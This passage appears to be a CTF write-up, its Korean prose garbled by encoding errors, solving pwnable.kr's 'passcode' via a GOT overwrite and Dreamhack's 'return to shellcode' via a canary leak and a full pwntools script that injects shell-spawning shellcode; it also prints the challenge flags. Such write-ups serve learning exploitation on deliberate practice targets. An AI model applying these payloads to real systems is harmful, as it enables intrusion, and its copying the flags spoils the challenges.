login í•¨ìˆ˜ì˜ ë””ìŠ¤ì–´ì…ˆë¸”ì½”ë“œë¥¼ ë‹¤ì‹œ ë³´ì. ê·¸ ì¤‘ +127ë¶€ë¶„ì„ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.

```sh
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
```

ë³¸ ì½”ë“œì™€ ë¹„êµë¥¼ í•´ë³´ë©´ ë‹¤ìŒì˜ ì½”ë“œë¥¼ ìˆ˜í–‰í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¼ê³  ì¶”ì¸¡í•  ìˆ˜ ìˆë‹¤.

```c
system("/bin/cat flag");
```

0x80487af ì£¼ì†Œì— ë‹´ê¸´ ê°’ì„ í™•ì¸í•´ ë³´ë‹ˆ "/bin/cat flag"ê°€ ë§ë‹¤.

```
gdb-peda$ x/s 0x80487af
0x80487af:      "/bin/cat flag"
```

ì¦‰ ë§Œì•½ 0x080485e3 ë¶€ë¶„ìœ¼ë¡œ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ë°”ê¾¼ë‹¤ë©´,fflushê°€ ìˆ˜í–‰ë˜ì§€ ì•Šê³  ë°”ë¡œ system("/bin/cat flag")ê°€ ìˆ˜í–‰ë˜ëŠ” ê²ƒì´ë‹¤.

## exploit
ì´ì œ ë‚´ìš©ì„ ì •ë¦¬í•˜ì—¬ exploitì„ í•´ë³´ì

1. welcome() í•¨ìˆ˜ì—ì„œ name[100]ì— ì…ë ¥ë˜ëŠ” ê°’ì„ ì…ë ¥ ë°›ì„ ë•Œ, dummy[96] + "fflushì˜ got"ì£¼ì†Œë¥¼ ì…ë ¥í•´ ì¤€ë‹¤.
2. scanfë¡œ ì…ë ¥ë°›ì„ ë•Œ, 0x80485e3ì´ ì…ë ¥ë˜ê²Œ í•´ì¤€ë‹¤. ê·¸ëŸ¬ë©´ fflshì˜ gotì— í•´ë‹¹ ê°’ì´ ì…ë ¥ë˜ê²Œ ë˜ê³  fflushë¥¼ ìˆ˜í–‰í•˜ë©´ 0x80485e3ë¶€í„° í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ëœë‹¤.

ì´ë•Œ scanfì—ì„œ ì…ë ¥ë°›ëŠ” ê°’ì€ %dë¡œ ì €ì¥í•˜ê¸° ë•Œë¬¸ì— 10ì§„ìˆ˜ë¡œ ë°”ê¿”ì„œ ì…ë ¥í•´ì¤˜ì•¼ í•œë‹¤.
0x80485e3ì´ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ë ¤ë©´ 10ì§„ìˆ˜ë¡œëŠ” 134514147ì´ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168552731-9d4af856-f5aa-48e3-9985-4f1b3b4a0311.png)


```sh
passcode@pwnable:~$ (python -c 'print("A"*96+"\x04\xa0\x04\x08")';cat) | ./passcode
Toddler\'s Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
134514147
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```

**flag**ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```
Sorry mom.. I got confused about scanf usage :(
```




# ì‹œìŠ¤í…œ - 2

**[return to shellcode](https://dreamhack.io/wargame/challenges/352/)**

ì´ë²ˆ ì‹œìŠ¤í…œ ë¬¸ì œëŠ” canaryê°€ ì„¤ì •ëœ ìƒíƒœì—ì„œ bof ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ flagë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì´ë‹¤.

```c
#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

ê¸°ì¡´ì— bof ë¬¸ì œì—ì„œ canaryê°’ì„ ì•Œì•„ë‚´ì–´ ì´ë¥¼ ê³ ë ¤í•˜ì—¬ retë¥¼ ë®ì–´ì¨ì•¼ í•œë‹¤.

ìš°ì„  canaryê°€ ë©”ëª¨ë¦¬ìƒì— ì–´ë–»ê²Œ ìœ„ì¹˜í•˜ê³  ìˆëŠ”ì§€ë¥¼ ì•Œê¸° ìœ„í•´ì„œ ë””ìŠ¤ì–´ì…ˆë¸”ì„ í•´ë³¸ë‹¤.

```sh
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000000008cd <+0>:	push   rbp
   0x00000000000008ce <+1>:	mov    rbp,rsp
   0x00000000000008d1 <+4>:	sub    rsp,0x60
   0x00000000000008d5 <+8>:	mov    rax,QWORD PTR fs:0x28  //raxì— canary ê°’ ë³µì‚¬
   0x00000000000008de <+17>:	mov    QWORD PTR [rbp-0x8],rax  //raxë¥¼ rbp-8ì— ë³µì‚¬

   ... ìƒëµ

   0x0000555555554956 <+137>:	lea    rax,[rbp-0x60] // bufì˜ ìœ„ì¹˜
   0x000055555555495a <+141>:	mov    edx,0x100
   0x000055555555495f <+146>:	mov    rsi,rax
   0x0000555555554962 <+149>:	mov    edi,0x0
   0x0000555555554967 <+154>:	call   0x555555554730 <read@plt>

```

ë©”ì¸í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸” í•´ë³´ë©´ ìŠ¤íƒ í”„ë ˆì„ì„ ìœ„í•´ì„œ ì´ 96byteë¥¼ í• ë‹¹í•˜ê³  ìˆê³ , canary wordì˜ ìœ„ì¹˜ëŠ” ebp-8ì´ë‹¤. 

ê·¸ë¦¬ê³  canarywordëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì½ê¸° ë°©ì§€ë¥¼ ìœ„í•´ì„œ ê°€ì¥ ì²« byteê°€ '\x00'ìœ¼ë¡œ ì‹œì‘í•˜ëŠ” íŠ¹ì§•ì„ ê°€ì§€ê³  ìˆë‹¤.

ì´ë¥¼ ê·¸ë¦¼ìœ¼ë¡œ ê·¸ë ¤ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ ìŠ¤íƒì´ ê·¸ë ¤ì§„ë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168712894-ac9936a0-c28c-4df8-985b-ba20ee8b4bf2.png)


í•´ë‹¹ ë¬¸ì œì—ì„œ ì‰˜ì„ íšë“í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì˜ ê³¼ì •ì´ í•„ìš”í•˜ë‹¤.

1. Canary ê°’ ì•Œì•„ë‚´ê¸°
2. Shell codeë¥¼ ì‘ì„±í•˜ì—¬ bufì— ë‹´ê¸°
3. ret ì£¼ì†Œë¥¼ buf ì‹œì‘ì£¼ì†Œë¡œ í•˜ì—¬ ì‰˜ì„ íšë“í•˜ê¸°

## Canary ê°’ 

ë¬¸ì œì—ì„œ ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ì„ ì¶œë ¥í•´ ì£¼ê¸° ë•Œë¬¸ì— canaryê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ê°€ ìˆë‹¤.

ì‚¬ìš©ìê°€ buf,dummyë¥¼ ë®ì„ 88byteì™€ ê±°ê¸°ì— canary ê°’ì˜ ì²« ë°”ì´íŠ¸ì¸ '\x00'ê¹Œì§€ ë®ë„ë¡ í•˜ë©´ ë‹¤ìŒ í•¨ìˆ˜ì—ì„œ canaryê°’ì„ ì½ê³  ê·¸ ë’¤ë¡œ ë©”ëª¨ë¦¬ì—ì„œ '\x00'ì„ ì½ì„ë•Œê¹Œì§€ ë°ì´í„°ë¥¼ ì¶œë ¥í•´ì£¼ê¸° ë•Œë¬¸ì´ë‹¤.

```c
  printf("Your input is '%s'\n", buf);
```

## Shell code ì‘ì„±
pwntoolsì—ì„œëŠ” shellcraftë¥¼ ì´ìš©í•˜ì—¬ ì‰½ê²Œ ì‰˜ì½”ë“œë¥¼ ë§Œë“¤ ìˆ˜ ìˆë‹¤. ì•„ì§ì€ ë‚´ê°€ ì‰˜ì½”ë“œë¥¼ ìŠ¤ìŠ¤ë¡œ ë§Œë“¤ ëŠ¥ë ¥ì€ ì•ˆë˜ì„œ,, ì—¬ê¸°ì €ê¸° ì‚¬ìš©ë²•ì„ ì°¾ì•„ë´¤ë”ë‹ˆ architectureë§Œ ì§€ì •í•´ì£¼ë©´ ë°”ë¡œ ì‰˜ì½”ë“œ ìƒì„±ì´ ë˜ì—ˆë‹¤. 

ì•„ë˜ëŠ” ì‰˜ì½”ë“œë¥¼ ìƒì„±í•˜ê³  bufì—ì„œ canaryê¹Œì§€ì˜ ê¸¸ì´(88byte)ì¤‘ ë¶€ì¡± ë¶€ë¶„ì€ ëª¨ë‘ '\x90'ìœ¼ë¡œ ì±„ìš°ëŠ” ì½”ë“œì´ë‹¤.

```py
context.arch = "amd64"
SHELLCODE = asm(shellcraft.sh()).ljust(buf2cnry,b"\x90")
```


## Buf ì£¼ì†Œ

ì´ ë¬¸ì œì—ì„œëŠ” bufì˜ ì£¼ì†Œë¥¼ ì‹œì‘ë¶€ë¶„ì—ì„œ ì£¼ì–´ì§„ë‹¤. ë”°ë¼ì„œ ë¦¬í„´ ì£¼ì†Œë¥¼ bufì˜ ì‹œì‘ì£¼ì†Œë¡œ ë°”ê¿”ì¤€ë‹¤.

ì´ë ‡ê²Œ í•´ì„œ ìŠ¤íƒì„ ë‹¤ìŒê³¼ ê°™ì´ ë³€ì¡°í•˜ë©´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/168714463-4a7f0ab2-7d8f-42d9-b466-f644da5abcbb.png)

## ì½”ë“œ
pwntoolsë¥¼ ì´ìš©í•œ ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```py
from pwn import *

p = remote("host1.dreamhack.games",13165)
# context.log_level=10

# ë²„í¼ ì£¼ì†Œ
p.recvuntil("Address of the buf: ")
buf_addr = p.recvline()[:-1]
print("buf_addr : {}".format(buf_addr))

# Distance
p.recvuntil("Distance between buf and $rbp: ")
buf2ebp = int(p.recvline()[:-1])
print("buf to ebp : {}".format(buf2ebp))

# get Canary value
buf2cnry = buf2ebp - 8
print("buf to canary : {}".format(buf2cnry))

payload = b"A"*(buf2cnry+1)
p.sendafter("Input:",payload)

p.recvuntil(payload)
canary = b"\x00" + p.recvn(7)
print("canary : {}".format(canary))

# SHELLCODE Exploit
context.arch = "amd64"
SHELLCODE = asm(shellcraft.sh()).ljust(buf2cnry,b"\x90")

payload = ( SHELLCODE +                         # SHELLCODE
            canary +                      # canary_value
            b"B"*8 +
            p64(int(buf_addr,16))               # ret addr ë³€ê²½. bufì£¼ì†Œë¡œ
)

p.sendafter("Input: ",payload)

p.interactive()

```

![image](https://user-images.githubusercontent.com/33647663/168714965-079f64d0-94e1-4b23-8e88-e6fd7e1bec0a.png)

```
flag : DH{333eb89c9d2615dd8942ece08c1d34d5}
```